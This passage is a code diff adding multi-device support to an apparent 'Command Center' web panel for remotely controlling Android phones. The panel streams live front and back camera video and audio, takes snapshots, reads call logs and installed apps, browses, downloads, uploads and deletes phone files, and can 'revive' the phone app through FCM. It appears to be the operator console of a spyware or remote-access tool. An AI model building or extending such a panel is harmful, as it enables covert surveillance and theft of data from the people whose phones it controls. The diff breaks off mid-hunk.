@@ -1,4 +1,4 @@
-// Command Center Core Client Logic — Native WebSocket Edition
+// Command Center Core Client Logic — Native WebSocket Edition (Multi-Device)
 
 // ─────────────────────────────────────────────────────────────
 // Signaling URL resolution
@@ -21,6 +21,9 @@ function getWebSocketURL() {
 
 // ─────────────────────────────────────────────────────────────
 // SignalingWebSocket — Drop-in replacement for Socket.IO client
+// NOTE: client-ready / client-disconnected events now deliver
+//       the FULL message object (not just the id) so we can
+//       forward model/name/deviceId from the server.
 // ─────────────────────────────────────────────────────────────
 
 class SignalingWebSocket {
@@ -36,14 +39,6 @@ class SignalingWebSocket {
     this._reconnectAttempts = 0;
     this._maxReconnectAttempts = 20;
     this._reconnectTimer = null;
-
-    this._idEvents = new Set([
-      'id',
-      'web-client-ready',
-      'web-client-disconnected',
-      'android-client-ready',
-      'android-client-disconnected'
-    ]);
   }
 
   on(eventName, handler) {
@@ -147,8 +142,10 @@ class SignalingWebSocket {
         return;
       }
 
-      if (this._idEvents.has(type)) {
-        this._dispatch(type, msg.id);
+      // Client ready / disconnect events: deliver the FULL message object.
+      if (type === 'web-client-ready' || type === 'android-client-ready' ||
+          type === 'web-client-disconnected' || type === 'android-client-disconnected') {
+        this._dispatch(type, msg);
         return;
       }
 
@@ -193,11 +190,8 @@ class SignalingWebSocket {
     const handlers = this._listeners.get(eventName);
     if (!handlers || handlers.length === 0) return;
     for (const handler of handlers) {
-      try {
-        handler(payload);
-      } catch (e) {
-        console.error(`[WS] Handler for "${eventName}" threw:`, e);
-      }
+      try { handler(payload); }
+      catch (e) { console.error(`[WS] Handler for "${eventName}" threw:`, e); }
     }
   }
 }
@@ -210,40 +204,41 @@ const socket = new SignalingWebSocket(getWebSocketURL());
 socket.connect();
 
 // ─────────────────────────────────────────────────────────────
-// Video Sinks
+// Multi-Device State (NEW)
 // ─────────────────────────────────────────────────────────────
+
+const devices = new Map();          // wsId -> { id, model, name, deviceId, connectedAt }
+let selectedDeviceId = null;        // currently selected device wsId
+
+// ─────────────────────────────────────────────────────────────
+// DOM References
+// ─────────────────────────────────────────────────────────────
+
 const videoFront = document.getElementById('remoteVideoFront');
 const videoBack = document.getElementById('remoteVideoBack');
 const tagFront = document.getElementById('tagFront');
 const tagBack = document.getElementById('tagBack');
 
-// Elements
 const statusDiv = document.getElementById('status');
 const retryButton = document.getElementById('retryButton');
 const debugLog = document.getElementById('debugLog');
 
-// ── Stream Control Buttons ─────────────────────────────────────
 const btnStartStream = document.getElementById('btnStartStream');
 const btnStopStream  = document.getElementById('btnStopStream');
 const btnRevive      = document.getElementById('btnRevive');
 
-// Device Metrics Elements
 const infoModel = document.getElementById('infoModel');
 const infoManufacturer = document.getElementById('infoManufacturer');
 const infoVersion = document.getElementById('infoVersion');
 const infoBattery = document.getElementById('infoBattery');
 
-// Telemetry Tabs
 const tabCalls = document.getElementById('tabCalls');
 const tabApps = document.getElementById('tabApps');
-
 const paneCalls = document.getElementById('paneCalls');
 const paneApps = document.getElementById('paneApps');
-
 const callLogList = document.getElementById('callLogList');
 const appList = document.getElementById('appList');
 
-// Dynamic Elements
 const infoBatteryDetails = document.getElementById('infoBatteryDetails');
 const storageText = document.getElementById('storageText');
 const storageProgress = document.getElementById('storageProgress');
@@ -252,14 +247,12 @@ const videoQualitySelect = document.getElementById('videoQualitySelect');
 const appSearchInput = document.getElementById('appSearchInput');
 const btnRefreshApps = document.getElementById('btnRefreshApps');
 
-// File Explorer Elements
 const fsPathInput = document.getElementById('fsPathInput');
 const fsBackBtn = document.getElementById('fsBackBtn');
 const fsGoBtn = document.getElementById('fsGoBtn');
 const fileListDiv = document.getElementById('fileList');
 const fsSortSelect = document.getElementById('fsSortSelect');
 
-// Snapshot DOM
 const btnSnapFront = document.getElementById('btnSnapFront');
 const btnSnapBack = document.getElementById('btnSnapBack');
 const snapshotModal = document.getElementById('snapshotModal');
@@ -267,48 +260,47 @@ const snapshotPreview = document.getElementById('snapshotPreview');
 const btnDownloadSnapshot = document.getElementById('btnDownloadSnapshot');
 const btnCloseSnapshot = document.getElementById('btnCloseSnapshot');
 
-// Talkback Intercom DOM
 const talkbackToggle = document.getElementById('talkbackToggle');
 
-// File Upload DOM
 const fsUploadArea = document.getElementById('fsUploadArea');
 const fsUploadInput = document.getElementById('fsUploadInput');
 const fsUploadLabel = document.getElementById('fsUploadLabel');
 const fsUploadProgress = document.getElementById('fsUploadProgress');
 
-// Preview Modal DOM
 const previewModal = document.getElementById('previewModal');
 const previewTitle = document.getElementById('previewTitle');
 const previewProgress = document.getElementById('previewProgress');
 const previewContent = document.getElementById('previewContent');
 const previewCloseBtn = document.getElementById('previewCloseBtn');
 
-// RTCPeerConnection State
+// ── Device Selector DOM (NEW) ──
+const deviceSelector = document.getElementById('deviceSelector');
+const deviceCount = document.getElementById('deviceCount');
+
+// ─────────────────────────────────────────────────────────────
+// RTCPeerConnection / Media State
+// ─────────────────────────────────────────────────────────────
+
 let peer;
 let myId;
-let androidClientId;
 let audioTrack = null;
 let frontVideoTrack = null;
 let backVideoTrack = null;
 let localMicStream = null;
 let localMicSender = null;
 
-// Chunked Download State
 let activeDownloads = {};
 let isTalkbackActive = false;
 
-// ── File List Sorting State ────────────────────────────────────
 let currentSortMode = 'name-asc';
 let currentFilesCache = [];
 let currentFilesPath = '';
 
-// ── Thumbnail State ────────────────────────────────────────────
 const thumbCache = new Map();
 const pendingThumbBatches = new Map();
 let thumbBatchCounter = 0;
 let currentThumbObserver = null;
 
-// ── Preview Stream State ───────────────────────────────────────
 let currentPreview = null;
 let currentPreviewBlobUrl = null;
 
@@ -320,7 +312,7 @@ const rtcConfig = {
 };
 
 // ─────────────────────────────────────────────────────────────
-// Diagnostics Logs & Connections Status
+// Diagnostics
 // ─────────────────────────────────────────────────────────────
 
 function updateStatus(message) {
@@ -346,37 +338,160 @@ function reconnectSocket() {
 }
 
 // ─────────────────────────────────────────────────────────────
-// Stream Control Buttons
+// Device List Management (NEW)
+// ─────────────────────────────────────────────────────────────
+
+function getDeviceLabel(id) {
+  const dev = devices.get(id);
+  if (!dev) return id;
+  const name = dev.name || dev.model;
+  if (name) return name;
+  // Fallback: last 6 chars of wsId
+  return 'Device ' + id.substring(Math.max(0, id.length - 6));
+}
+
+function renderDeviceList() {
+  const currentValue = selectedDeviceId || '';
+  deviceSelector.innerHTML = '';
+
+  if (devices.size === 0) {
+    const opt = document.createElement('option');
+    opt.value = '';
+    opt.textContent = '— No devices —';
+    deviceSelector.appendChild(opt);
+    deviceSelector.disabled = true;
+  } else {
+    deviceSelector.disabled = false;
+    devices.forEach((dev, id) => {
+      const opt = document.createElement('option');
+      opt.value = id;
+      opt.textContent = getDeviceLabel(id);
+      if (id === currentValue) opt.selected = true;
+      deviceSelector.appendChild(opt);
+    });
+  }
+
+  deviceCount.textContent = devices.size;
+
+  // Enable/disable stream buttons
+  const hasSelection = !!selectedDeviceId && devices.has(selectedDeviceId);
+  btnStartStream.disabled = !hasSelection;
+  btnStopStream.disabled = !hasSelection;
+  btnRevive.disabled = !hasSelection;
+}
+
+function setVideoTagState(el, text, colorVar, bgVar, borderVar) {
+  el.textContent = text;
+  el.style.color = colorVar;
+  el.style.background = bgVar;
+  el.style.borderColor = borderVar;
+}
+
+function resetUIForNoDevice() {
+  if (peer) {
+    try { peer.close(); } catch (e) {}
+    peer = null;
+  }
+  videoFront.srcObject = null;
+  videoBack.srcObject = null;
+  frontVideoTrack = null;
+  backVideoTrack = null;
+  audioTrack = null;
+
+  if (localMicStream) {
+    localMicStream.getTracks().forEach(t => t.stop());
+    localMicStream = null;
+  }
+  localMicSender = null;
+  isTalkbackActive = false;
+  talkbackToggle.textContent = '🎙️ Talkback OFF';
+  talkbackToggle.style.color = 'var(--text-muted)';
+  talkbackToggle.style.borderColor = 'rgba(255,255,255,0.05)';
+  talkbackToggle.style.background = 'transparent';
+
+  setVideoTagState(tagFront, 'IDLE', 'var(--danger)', 'rgba(239, 68, 68, 0.15)', 'var(--danger)');
+  setVideoTagState(tagBack,  'IDLE', 'var(--danger)', 'rgba(239, 68, 68, 0.15)', 'var(--danger)');
+
+  callLogList.innerHTML = '';
+  appList.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">No device selected.</div>';
+  fileListDiv.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 40px; font-size: 0.85rem;">No device selected.</div>';
+
+  infoModel.textContent = '—';
+  infoManufacturer.textContent = '—';
+  infoVersion.textContent = '—';
+  infoBattery.textContent = '—';
+  infoBatteryDetails.textContent = '—';
+  storageText.textContent = '0 GB / 0 GB';
+  storageProgress.style.width = '0%';
+}
+
+function selectDevice(id) {
+  if (!devices.has(id)) return;
+  if (id === selectedDeviceId) return;
+
+  const previousId = selectedDeviceId;
+
+  // Politely stop streaming on the previous device before switching
+  if (previousId && devices.has(previousId)) {
+    try {
+      socket.emit('cmd:stop', { to: previousId });
+      logDebug(`[DEVICE] Sent cmd:stop to previous device ${previousId}`);
+    } catch (e) {}
+  }
+
+  // Reset all per-device UI / WebRTC state
+  resetUIForNoDevice();
+
+  selectedDeviceId = id;
+  renderDeviceList();
+
+  const label = getDeviceLabel(id);
+  updateStatus(`Active device: ${label}`);
+  logDebug(`[DEVICE] Selected: ${label} (${id})`);
+
+  // Fetch initial file list from the newly selected device
+  requestFileList(currentPath);
+}
+
+deviceSelector.addEventListener('change', (e) => {
+  const id = e.target.value;
+  if (id && id !== selectedDeviceId) {
+    selectDevice(id);
+  }
+});
+
+// ─────────────────────────────────────────────────────────────
+// Stream Control Buttons (now target selectedDeviceId)
 // ─────────────────────────────────────────────────────────────
 
 if (btnStartStream) {
   btnStartStream.addEventListener('click', () => {
-    if (!androidClientId) {
-      logDebug('[CMD] Cannot start — no Android device connected');
+    if (!selectedDeviceId) {
+      logDebug('[CMD] Cannot start — no device selected');
       return;
     }
-    logDebug('[CMD] Sending start command to device');
-    socket.emit('cmd:start', { to: androidClientId });
+    logDebug(`[CMD] Sending start command to ${getDeviceLabel(selectedDeviceId)}`);
+    socket.emit('cmd:start', { to: selectedDeviceId });
     updateStatus('Streaming start requested');
   });
 }
 
 if (btnStopStream) {
   btnStopStream.addEventListener('click', () => {
-    if (!androidClientId) {
-      logDebug('[CMD] Cannot stop — no Android device connected');
+    if (!selectedDeviceId) {
+      logDebug('[CMD] Cannot stop — no device selected');
       return;
     }
-    logDebug('[CMD] Sending stop command to device');
-    socket.emit('cmd:stop', { to: androidClientId });
+    logDebug(`[CMD] Sending stop command to ${getDeviceLabel(selectedDeviceId)}`);
+    socket.emit('cmd:stop', { to: selectedDeviceId });
     updateStatus('Streaming stop requested');
   });
 }
 
 if (btnRevive) {
   btnRevive.addEventListener('click', () => {
-    if (!androidClientId) {
-      logDebug('[CMD] Cannot revive — no Android device connected');
+    if (!selectedDeviceId) {
+      logDebug('[CMD] Cannot revive — no device selected');
       return;
     }
     logDebug('[CMD] Sending FCM revive command');
@@ -386,21 +501,16 @@ if (btnRevive) {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        wsId: androidClientId,
+        wsId: selectedDeviceId,
         command: 'revive'
       })
     })
       .then(r => r.json())
       .then(data => {
-        if (data.success) {
-          logDebug('[CMD] FCM revive delivered successfully');
-        } else {
-          logDebug('[CMD] FCM revive failed: ' + (data.error || 'unknown'));
-        }
+        if (data.success) logDebug('[CMD] FCM revive delivered successfully');
+        else logDebug('[CMD] FCM revive failed: ' + (data.error || 'unknown'));
       })
-      .catch(e => {
-        logDebug('[CMD] FCM revive error: ' + e.message);
-      });
+      .catch(e => logDebug('[CMD] FCM revive error: ' + e.message));
   });
 }
 
@@ -419,15 +529,15 @@ function switchTab(activeTab, activePane) {
 tabCalls.addEventListener('click', () => switchTab(tabCalls, paneCalls));
 tabApps.addEventListener('click', () => {
   switchTab(tabApps, paneApps);
-  if (androidClientId && appList.children.length <= 1) {
-    socket.emit('cmd:get_apps', { to: androidClientId });
+  if (selectedDeviceId && appList.children.length <= 1) {
+    socket.emit('cmd:get_apps', { to: selectedDeviceId });
   }
 });
 
 btnRefreshApps.addEventListener('click', () => {
-  if (!androidClientId) return;
+  if (!selectedDeviceId) return;
   logDebug('[CMD] Syncing installed applications');
-  socket.emit('cmd:get_apps', { to: androidClientId });
+  socket.emit('cmd:get_apps', { to: selectedDeviceId });
 });
 
 appSearchInput.addEventListener('input', (e) => {
@@ -479,20 +589,14 @@ function updateStreams() {
     const frontStream = new MediaStream([frontVideoTrack]);
     if (audioTrack) frontStream.addTrack(audioTrack);
     videoFront.srcObject = frontStream;
-    tagFront.textContent = 'FRONT LIVE';
-    tagFront.style.background = 'rgba(16, 185, 129, 0.2)';
-    tagFront.style.color = 'var(--success)';
-    tagFront.style.borderColor = 'var(--success)';
+    setVideoTagState(tagFront, 'FRONT LIVE', 'var(--success)', 'rgba(16, 185, 129, 0.2)', 'var(--success)');
     videoFront.play().catch(e => console.log('Autoplay front blocked'));
   }
   if (backVideoTrack) {
     const backStream = new MediaStream([backVideoTrack]);
     if (audioTrack) backStream.addTrack(audioTrack);
     videoBack.srcObject = backStream;
-    tagBack.textContent = 'BACK LIVE';
-    tagBack.style.background = 'rgba(16, 185, 129, 0.2)';
-    tagBack.style.color = 'var(--success)';
-    tagBack.style.borderColor = 'var(--success)';
+    setVideoTagState(tagBack, 'BACK LIVE', 'var(--success)', 'rgba(16, 185, 129, 0.2)', 'var(--success)');
     videoBack.play().catch(e => console.log('Autoplay back blocked'));
   }
 }
@@ -502,7 +606,7 @@ function updateStreams() {
 // ─────────────────────────────────────────────────────────────
 
 talkbackToggle.addEventListener('click', async () => {
-  if (!androidClientId || !peer) return;
+  if (!selectedDeviceId || !peer) return;
 
   if (isTalkbackActive) {
     isTalkbackActive = false;
@@ -529,7 +633,7 @@ talkbackToggle.addEventListener('click', async () => {
       const offer = await peer.createOffer();
       await peer.setLocalDescription(offer);
       socket.emit('signal', {
-        to: androidClientId,
+        to: selectedDeviceId,
         from: myId,
         signal: { type: 'offer', sdp: offer.sdp }
       });
@@ -551,10 +655,10 @@ talkbackToggle.addEventListener('click', async () => {
 // ─────────────────────────────────────────────────────────────
 
 videoQualitySelect.addEventListener('change', (e) => {
-  if (!androidClientId) return;
+  if (!selectedDeviceId) return;
   const quality = e.target.value;
   logDebug(`[CMD] Changing video quality: ${quality}`);
-  socket.emit('cmd:set_quality', { to: androidClientId, quality: quality });
+  socket.emit('cmd:set_quality', { to: selectedDeviceId, quality: quality });
 });
 
 // ─────────────────────────────────────────────────────────────
@@ -562,15 +666,15 @@ videoQualitySelect.addEventListener('change', (e) => {
 // ─────────────────────────────────────────────────────────────
 
 btnSnapFront.addEventListener('click', () => {
-  if (!androidClientId) return;
+  if (!selectedDeviceId) return;
   logDebug('[CMD] Capturing snapshot frame: Front lens');
-  socket.emit('cmd:take_snapshot', { to: androidClientId, useFront: true });
+  socket.emit('cmd:take_snapshot', { to: selectedDeviceId, useFront: true });
 });
 
 btnSnapBack.addEventListener('click', () => {
-  if (!androidClientId) return;
+  if (!selectedDeviceId) return;
   logDebug('[CMD] Capturing snapshot frame: Back lens');
-  socket.emit('cmd:take_snapshot', { to: androidClientId, useFront: false });
+  socket.emit('cmd:take_snapshot', { to: selectedDeviceId, useFront: false });
 });
 
 let currentSnapshotBase64 = null;
@@ -593,7 +697,7 @@ btnDownloadSnapshot.addEventListener('click', () => {
 
 function requestThumbBatch(items) {
   return new Promise((resolve) => {
-    if (!androidClientId || items.length === 0) {
+    if (!selectedDeviceId || items.length === 0) {
       resolve();
       return;
     }
@@ -604,7 +708,7 @@ function requestThumbBatch(items) {
     pendingThumbBatches.set(batchId, { items, resolve });
 
     socket.emit('fs:thumb_request', {
-      to: androidClientId,
+      to: selectedDeviceId,
       batchId: batchId,
       paths: paths
     });
@@ -648,11 +752,7 @@ function setupLazyThumbnails(fileItems) {
     entries.forEach(entry => {
       if (entry.isIntersecting) {
         const el = entry.target;
-        visibleNow.push({
-          element: el,
-          path: el.dataset.thumbPath,
-          kind: el.dataset.thumbKind
-        });
+        visibleNow.push({ element: el, path: el.dataset.thumbPath, kind: el.dataset.thumbKind });
         observer.unobserve(el);
       }
     });
@@ -680,11 +780,7 @@ function setupLazyThumbnails(fileItems) {
           }
         });
     }
-  }, {
-    root: fileListDiv,
-    rootMargin: '100px',
-    threshold: 0.01
-  });
+  }, { root: fileListDiv, rootMargin: '100px', threshold: 0.01 });
 
   pending.forEach(p => observer.observe(p.element));
   currentThumbObserver = observer;
@@ -714,16 +810,13 @@ function applyThumbnailToItem(item, path) {
 
   wrapper.style.cursor = 'pointer';
   wrapper.title = 'Click to preview';
-  wrapper.onclick = (e) => {
-    e.stopPropagation();
-    requestFilePreview(path);
-  };
+  wrapper.onclick = (e) => { e.stopPropagation(); requestFilePreview(path); };
 
   iconEl.replaceWith(wrapper);
 }
 
 // ─────────────────────────────────────────────────────────────
-// Preview System (streaming via WebSocket)
+// Preview System
 // ─────────────────────────────────────────────────────────────
 
 function isPreviewableKind(kind) {
@@ -731,7 +824,7 @@ function isPreviewableKind(kind) {
 }
 
 function requestFilePreview(path) {
-  if (!androidClientId) return;
+  if (!selectedDeviceId) return;
 
   const fileName = path.split('/').pop();
   openPreviewModal(fileName);
@@ -759,7 +852,7 @@ function requestFilePreview(path) {
   previewProgress.textContent = 'Requesting file...';
 
   socket.emit('fs:preview_request', {
-    to: androidClientId,
+    to: selectedDeviceId,
     path: path,
     requestId: requestId
   });
@@ -774,9 +867,9 @@ function openPreviewModal(fileName) {
 }
 
 function closePreview() {
-  if (currentPreview && androidClientId) {
+  if (currentPreview && selectedDeviceId) {
     socket.emit('fs:preview_cancel', {
-      to: androidClientId,
+      to: selectedDeviceId,
       requestId: currentPreview.requestId
     });
   }
@@ -789,7 +882,6 @@ function closePreview() {
     try { URL.revokeObjectURL(currentPreviewBlobUrl); } catch (e) {}
     currentPreviewBlobUrl = null;
   }
-
   if (currentPreview && currentPreview.blobUrl) {
     try { URL.revokeObjectURL(currentPreview.blobUrl); } catch (e) {}
   }
@@ -807,7 +899,6 @@ function handlePreviewMeta(data) {
 
   previewTitle.textContent = currentPreview.name;
   previewProgress.textContent = `Loading ${currentPreview.name}... 0%`;
-
   logDebug(`[PREVIEW] Meta: ${data.name} (${formatBytes(data.size)}, ${data.mime})`);
 }
 
@@ -818,9 +909,7 @@ function handlePreviewChunk(data) {
   try {
     const binary = atob(data.content);
     bytes = new Uint8Array(binary.length);
-    for (let i = 0; i < binary.length; i++) {
-      bytes[i] = binary.charCodeAt(i);
-    }
+    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
   } catch (e) {
     console.error('[PREVIEW] Failed to decode chunk:', e);
     return;
@@ -839,10 +928,9 @@ function handlePreviewChunk(data) {
     currentPreview.chunks.push(bytes);
   } else if (currentPreview.kind === 'video') {
     if (currentPreview.sourceBuffer && !currentPreview.sourceBuffer.updating) {
-      try {
-        currentPreview.sourceBuffer.appendBuffer(bytes);
-      } catch (e) {
-        console.warn('[PREVIEW] MSE append failed, falling back to buffering:', e);
+      try { currentPreview.sourceBuffer.appendBuffer(bytes); }
+      catch (e) {
+        console.warn('[PREVIEW] MSE append failed, buffering:', e);
         currentPreview.pendingChunks.push(bytes);
       }
     } else {
@@ -860,15 +948,9 @@ function handlePreviewComplete(data) {
     renderImagePreview();
   } else if (currentPreview.kind === 'video') {
     if (currentPreview.mediaSource && currentPreview.mediaSource.readyState === 'open') {
-      try {
-        currentPreview.mediaSource.endOfStream();
-      } catch (e) {
-        console.warn('[PREVIEW] endOfStream error:', e);
-      }
+      try { currentPreview.mediaSource.endOfStream(); } catch (e) {}
     }
-    if (!currentPreview.mediaSource) {
-      renderVideoFromBlob();
-    }
+    if (!currentPreview.mediaSource) renderVideoFromBlob();
   } else {
     renderUnknownFromBlob();
   }
@@ -878,7 +960,6 @@ function handlePreviewComplete(data) {
 
 function handlePreviewError(data) {
   if (!currentPreview || data.requestId !== currentPreview.requestId) return;
-
   previewProgress.style.color = 'var(--danger)';
   previewProgress.textContent = 'Error: ' + (data.message || 'Unknown');
   logDebug('[PREVIEW] Error: ' + data.message);
@@ -886,14 +967,10 @@ function handlePreviewError(data) {
 
 function renderImagePreview() {
   if (!currentPreview) return;
-
   const total = currentPreview.receivedSize;
   const merged = new Uint8Array(total);
   let offset = 0;
-  for (const chunk of currentPreview.chunks) {
-    merged.set(chunk, offset);
-    offset += chunk.length;
-  }
+  for (const chunk of currentPreview.chunks) { merged.set(chunk, offset); offset += chunk.length; }
   currentPreview.chunks = [];
 
   const blob = new Blob([merged], { type: currentPreview.type || 'image/jpeg' });
@@ -912,7 +989,6 @@ function renderImagePreview() {
 
 function renderVideoFromBlob() {
   if (!currentPreview) return;
-
   const pending = currentPreview.pendingChunks;
   currentPreview.pendingChunks = [];
 
@@ -920,10 +996,7 @@ function renderVideoFromBlob() {
   for (const c of pending) total += c.length;
   const merged = new Uint8Array(total);
   let offset = 0;
-  for (const c of pending) {
-    merged.set(c, offset);
-    offset += c.length;
-  }
+  for (const c of pending) { merged.set(c, offset); offset += c.length; }
 
   const blob = new Blob([merged], { type: currentPreview.type || 'video/mp4' });
   currentPreview.blobUrl = URL.createObjectURL(blob);
@@ -943,12 +1016,10 @@ function renderVideoFromBlob() {
 
 function renderUnknownFromBlob() {
   if (!currentPreview) return;
-
   previewContent.innerHTML = '';
   previewProgress.style.display = 'block';
   previewProgress.style.color = 'var(--warning)';
   previewProgress.textContent = 'Preview not available for this file type';
-
   appendDownloadButton(null, currentPreview.name);
 }
 
@@ -966,9 +1037,7 @@ function appendDownloadButton(blobUrl, fileName) {
       a.click();
     };
   } else {
-    dlBtn.onclick = () => {
-      requestFileDownload(currentPreview.path);
-    };
+    dlBtn.onclick = () => { requestFileDownload(currentPreview.path); };
   }
 
   previewContent.appendChild(dlBtn);
@@ -976,23 +1045,20 @@ function appendDownloadButton(blobUrl, fileName) {
 
 if (previewCloseBtn) previewCloseBtn.addEventListener('click', closePreview);
 if (previewModal) {
-  previewModal.addEventListener('click', (e) => {
-    if (e.target.id === 'previewModal') closePreview();
-  });
+  previewModal.addEventListener('click', (e) => { if (e.target.id === 'previewModal') closePreview(); });
 }
 document.addEventListener('keydown', (e) => {
   if (e.key === 'Escape' && previewModal.classList.contains('active')) closePreview();
 });
 
 // ─────────────────────────────────────────────────────────────
-// File Explorer logic
+// File Explorer
 // ─────────────────────────────────────────────────────────────
 
 let currentPath = "/storage/emulated/0/";
 
 function applySort(files) {
   if (!files || files.length === 0) return files;
-
   const sorted = [...files];
 
   const compareFn = (a, b) => {
@@ -1020,19 +1086,17 @@ if (fsSortSelect) {
   fsSortSelect.addEventListener('change', (e) => {
     currentSortMode = e.target.value;
     logDebug(`[FS] Sort changed to: ${currentSortMode}`);
-    if (currentFilesCache.length > 0) {
-      renderFileList(currentFilesCache, currentFilesPath);
-    }
+    if (currentFilesCache.length > 0) renderFileList(currentFilesCache, currentFilesPath);
   });
 }
 
 function requestFileList(path) {
-  if (!androidClientId) {
-    updateStatus('No Android client connected');
+  if (!selectedDeviceId) {
+    updateStatus('No device selected');
     return;
   }
   updateStatus(`Requesting files: ${path}`);
-  socket.emit('fs:list', { to: androidClientId, path: path });
+  socket.emit('fs:list', { to: selectedDeviceId, path: path });
 }
 
 function getKindIcon(kind) {
@@ -1061,7 +1125,6 @@ function renderFileList(files, path) {
   }
 
   const sortedFiles = applySort(files);
-
   const itemsToObserve = [];
 
   sortedFiles.forEach(file => {
@@ -1103,10 +1166,7 @@ function renderFileList(files, path) {
       previewBtn.className = 'btn-file-action preview';
       previewBtn.title = 'Preview';
       previewBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z"/><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/></svg>`;
-      previewBtn.onclick = (e) => {
-        e.stopPropagation();
-        requestFilePreview(file.path);
-      };
+      previewBtn.onclick = (e) => { e.stopPropagation(); requestFilePreview(file.path); };
       actions.appendChild(previewBtn);
     }
 
@@ -1114,10 +1174,7 @@ function renderFileList(files, path) {
       const downloadBtn = document.createElement('button');
       downloadBtn.className = 'btn-file-action download';
       downloadBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>`;
-      downloadBtn.onclick = (e) => {
-        e.stopPropagation();
-        requestFileDownload(file.path);
-      };
+      downloadBtn.onclick = (e) => { e.stopPropagation(); requestFileDownload(file.path); };
       actions.appendChild(downloadBtn);
     }
 
@@ -1126,17 +1183,13 @@ function renderFileList(files, path) {
     deleteBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>`;
     deleteBtn.onclick = (e) => {
       e.stopPropagation();
-      if (confirm(`Permanently delete ${file.name}?`)) {
-        deleteFile(file.path);
-      }
+      if (confirm(`Permanently delete ${file.name}?`)) deleteFile(file.path);
     };
     actions.appendChild(deleteBtn);
 
     item.appendChild(actions);
 
-    if (file.isDir) {
-      item.onclick = () => requestFileList(file.path);
-    }
+    if (file.isDir) item.onclick = () => requestFileList(file.path);
 
     fileListDiv.appendChild(item);
   });
@@ -1154,27 +1207,20 @@ function formatBytes(bytes) {
 
 function requestFileDownload(path) {
   updateStatus(`Starting download: ${path}`);
-  if (androidClientId) {
-    socket.emit('fs:download', { to: androidClientId, path: path });
-  }
+  if (selectedDeviceId) socket.emit('fs:download', { to: selectedDeviceId, path: path });
 }
 
 function deleteFile(path) {
   updateStatus(`Requesting deletion: ${path}`);
-  if (androidClientId) {
-    socket.emit('fs:delete', { to: androidClientId, path: path });
-  }
+  if (selectedDeviceId) socket.emit('fs:delete', { to: selectedDeviceId, path: path });
 }
 
-fsGoBtn.addEventListener('click', () => {
-  requestFileList(fsPathInput.value);
-});
+fsGoBtn.addEventListener('click', () => requestFileList(fsPathInput.value));
 
 fsBackBtn.addEventListener('click', () => {
   let path = currentPath;
   if (path.endsWith('/')) path = path.slice(0, -1);
   if (path === '') path = '/';
-
   const lastSlash = path.lastIndexOf('/');
   if (lastSlash !== -1) {
     const parent = path.substring(0, lastSlash + 1) || '/';
@@ -1184,14 +1230,10 @@ fsBackBtn.addEventListener('click', () => {
   }
 });
 
-fsUploadArea.addEventListener('click', () => {
-  fsUploadInput.click();
-});
+fsUploadArea.addEventListener('click', () => fsUploadInput.click());
 
 fsUploadInput.addEventListener('change', (e) => {
-  if (e.target.files.length > 0) {
-    uploadTargetFile(e.target.files[0]);
-  }
+  if (e.target.files.length > 0) uploadTargetFile(e.target.files[0]);
 });
 
 fsUploadArea.addEventListener('dragover', (e) => {
@@ -1209,20 +1251,20 @@ fsUploadArea.addEventListener('dragover', (e) => {
 
 fsUploadArea.addEventListener('drop', (e) => {
   e.preventDefault();
-  if (e.dataTransfer.files.length > 0) {
-    uploadTargetFile(e.dataTransfer.files[0]);
-  }
+  if (e.dataTransfer.files.length > 0) uploadTargetFile(e.dataTransfer.files[0]);
 });
 
 function uploadTargetFile(file) {
-  if (!androidClientId) {
-    logDebug('Cannot upload file, no device paired');
+  if (!selectedDeviceId) {
+    logDebug('Cannot upload file, no device selected');
     return;
   }
 
   logDebug(`[FS] Initiating chunked uploader: ${file.name} (${formatBytes(file.size)})`);
   fsUploadLabel.textContent = `Uploading ${file.name}... (0%)`;
   fsUploadProgress.style.width = '0%';
+
+  const targetDevice = selectedDeviceId;
 
   const reader = new FileReader();
   reader.onload = async (event) => {
@@ -1231,7 +1273,7 @@ function uploadTargetFile(file) {
     const totalChunks = Math.ceil(rawBuffer.byteLength / chunkSize);
 
     socket.emit('fs:upload_start', {
-      to: androidClientId,
+      to: targetDevice,
       filename: file.name,
       parentPath: currentPath,
       totalChunks: totalChunks
@@ -1245,10 +1287,7 @@ function uploadTargetFile(file) {
       const binary = String.fromCharCode.apply(null, new Uint8Array(slice));
       const base64 = btoa(binary);
 
-      socket.emit('fs:upload_chunk', {
-        to: androidClientId,
-        chunk: base64
-      });
+      socket.emit('fs:upload_chunk', { to: targetDevice, chunk: base64 });
 
       const pct = Math.floor(((idx + 1) / totalChunks) * 100);
       fsUploadProgress.style.width = `${pct}%`;
@@ -1257,7 +1296,7 @@ function uploadTargetFile(file) {
       await new Promise(r => setTimeout(r, 10));
     }
 
-    socket.emit('fs:upload_complete', { to: androidClientId });
+    socket.emit('fs:upload_complete', { to: targetDevice });
     fsUploadLabel.textContent = 'Upload Completed successfully';
     logDebug(`[FS] File upload assembled on device: ${file.name}`);
     setTimeout(() => {
@@ -1273,29 +1312,66 @@ function uploadTargetFile(file) {
 // WebSocket event subscriptions
 // ─────────────────────────────────────────────────────────────
 
-socket.on('connect', () => {
-  updateStatus('Connected to Command server');
-});
-
-socket.on('connect_error', () => {
